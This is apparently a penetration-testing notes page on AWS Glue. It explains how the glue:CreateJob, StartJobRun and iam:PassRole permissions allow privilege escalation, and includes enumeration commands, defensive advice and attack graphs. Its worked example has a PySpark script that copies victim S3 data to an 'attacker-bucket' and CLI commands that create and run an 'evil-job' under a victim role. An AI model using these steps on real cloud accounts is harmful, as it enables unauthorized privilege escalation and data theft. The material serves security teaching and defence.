# Core

**AWS Glue** is a fully managed service for **ETL (Extract, Transform, Load)**:

- **Extract** - pulls data from multiple sources (S3, RDS, Redshift, JDBC, etc.).
- **Transform** - processes and cleans data (e.g., via PySpark scripts).
- **Load** - loads data into storage (such as S3 or Redshift) for analytics or Machine Learning.

**Common use cases:**

- Preparing data for analytics (Athena, ML, Redshift).
- Integrating multiple data sources.
- Data cataloging (via **Glue Data Catalog** - table and database metadata).

---

# 🛡 Glue in an AWS Pentest Context

## 📍 What may be interesting from an attacker’s perspective:

1. **Access to sensitive data**
   - Glue often interacts with S3 buckets, RDS, and Redshift.
   - Scripts and pipelines may contain **secrets, keys, or credentials**, including hardcoded values.
   - For example, a Glue Job script may include `aws_access_key_id` and `aws_secret_access_key`.

2. **Privilege escalation via IAM roles**
   - Glue jobs typically run under an **IAM role**.
   - If you can **edit or run a Glue Job**, you can leverage the role attached to it.
   - If that role has broader permissions - 💥 privilege escalation.

3. **Access misconfiguration**
   - Having `glue:*` is effectively admin-level access.
   - A common issue is having `glue:CreateJob` + `iam:PassRole`; even with a restricted role, this allows running arbitrary code under a higher-privileged role.

4. **Code execution**
   - Glue jobs can be created with custom Python (PySpark) scripts.
   - If you can run your own code → you can exfiltrate data, perform backups, scan the network, upload shells to S3, etc.

---

## 🔍 What to Look for During a Pentest:

| Target | What to Check | Why It Matters |
| --- | --- | --- |
| **Glue Jobs** | `aws glue get-jobs`, `aws glue get-job --name your-job` | Retrieve scripts, discover secrets |
| **Data Catalog** | `aws glue get-databases`, `aws glue get-tables` | Visibility into existing databases and tables |
| **Permissions** | `iam list-policies`, `glue:CreateJob`, `glue:StartJobRun`, `iam:PassRole` | Privilege escalation and code execution paths |
| **Connections** | `aws glue get-connections` | JDBC endpoints; may reveal DB credentials |

---

# Example Attack via a Glue Job

## 📌 Preconditions:

You have **already compromised an IAM user** with the following permissions:

- `glue:CreateJob`
- `glue:StartJobRun`
- `iam:PassRole` (on a Glue service role with access to a target S3 bucket)

---

### 🧪 Step 1: Write a PySpark Script

Example script that reads data from S3 and sends it to you (or writes it to another bucket):

```python
import boto3

def upload_data():
    s3 = boto3.client('s3')
    bucket = 'target-victim-bucket'
    key = 'secret-data.txt'

    # Read file (or list of files)
    obj = s3.get_object(Bucket=bucket, Key=key)
    data = obj['Body'].read().decode('utf-8')

    # Exfiltrate data - e.g., to your own bucket
    s3.put_object(Bucket='attacker-bucket', Key='loot.txt', Body=data)

upload_data()
```

> 🔐 You could also download the entire bucket if you use `list_objects_v2`.
> 

---

### 🛠 Step 2: Create the Glue Job

```bash
aws glue create-job \
  --name evil-job \
  --role arn:aws:iam::victim:role/GlueServiceRoleWithS3Access \
  --command '{"Name":"glueetl","ScriptLocation":"s3://attacker-bucket/evil_script.py","PythonVersion":"3"}' \
  --region your-region
```

> 👉 Make sure to upload `evil_script.py` to your S3 bucket beforehand.

---

### 🚀 Step 3: Start the Job

```bash
aws glue start-job-run --job-name evil-job
```

If successful, the script executes under the role passed via --role, not your compromised user.
This results in Privilege Escalation + Data Exfiltration.

---

## 🔐 Defensive Notes (Blue Team):

- Never grant unrestricted iam:PassRole
- Always restrict which roles Glue can assume
- Monitor Glue Job scripts and executions (CloudTrail)
- Isolate sensitive S3 buckets via bucket policies

# Graphs

## 🔗 Attack Graph - AWS Glue
```
[Compromised IAM User]
          |
          v
[Enumerate Glue Resources]
 (get-jobs, get-databases,
  get-connections)
          |
          v
[Access Glue Job Scripts]
          |
          +--> [Hardcoded Secrets]
          |        |
          |        v
          |   [DB / API Access]
          |
          +--> [IAM Role Identified]
                    |
                    v
        [Check Permissions of Role]
                    |
                    v
      [S3 / RDS / Redshift Access]
```
**💡 What this graph shows:**
- Glue acts as a data aggregation point.
- Even without direct admin access, you can:
- see pipelines,
- discover secrets,
- understand data flows,
- identify roles with excessive permissions.

## ⚠️ Privilege Escalation Graph - Glue + IAM
```
[Limited IAM User]
  |  glue:CreateJob
  |  glue:StartJobRun
  |  iam:PassRole
  v
[Create Malicious Glue Job]
          |
          v
[Attach High-Privileged IAM Role]
          |
          v
[Execute Arbitrary Code]
          |
          v
[Privilege Escalation]
          |
          +--> S3 Full Access
          +--> RDS Dump
          +--> IAM Enumeration
          +--> Lateral Movement
```
**💥 Key idea:**
Glue Job = Remote Code Execution under an IAM Role

If you have:
   - `CreateJob`
   - `StartJobRun`
   - `iam:PassRole`

👉 this is almost always game over.

## 🧠 Expanded Attack Path (Mental Model)
```
IAM User
  |
  v
Glue Control Plane
  |
  +--> Scripts (code)
  +--> Connections (creds)
  +--> Data Catalog (metadata)
  |
  v
Glue Execution Role
  |
  v
AWS Data Plane
(S3, RDS, Redshift, etc.)
```
Glue acts as a bridge between the control plane and the data plane,
which is why it becomes extremely dangerous when misconfigured.

## 🛡 Defensive Graph (Blue Team View)
```
[Glue Job]
   |
   +--> Restricted IAM Role
   |       |
   |       v
   |   Least Privilege
   |
   +--> Script Review
   |
   +--> CloudTrail Monitoring
   |
   +--> S3 Bucket Policies
```

# 🔍 Indicators of High Risk
```
[ ] glue:CreateJob
[ ] glue:StartJobRun
[ ] iam:PassRole
[ ] Broad Glue Service Role
[ ] S3 access from Glue Role
```
If 2 or more items are present, look for an escalation path.
